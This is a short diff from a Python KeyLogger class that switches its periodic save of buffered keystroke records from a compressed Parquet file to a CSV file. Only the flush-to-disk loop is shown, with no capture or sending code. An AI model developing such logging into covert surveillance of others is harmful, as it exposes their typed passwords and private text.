@@ -40,16 +40,12 @@ class KeyLogger:
             with self.lock:
                 if self.data:
                     df = pd.DataFrame(self.data)
-                    if os.path.exists("key_log.parquet"):
-                        existing_df = pd.read_parquet("key_log.parquet")
+                    if os.path.exists("key_log.csv"):
+                        existing_df = pd.read_csv("key_log.csv")
                         combined_df = pd.concat([existing_df, df])
-                        combined_df.to_parquet(
-                            "key_log.parquet", compression="snappy", index=False
-                        )
+                        combined_df.to_csv("key_log.csv", index=False)
                     else:
-                        df.to_parquet(
-                            "key_log.parquet", compression="snappy", index=False
-                        )
+                        df.to_csv("key_log.csv", index=False)
                     self.data = []
             time.sleep(self.interval)
 
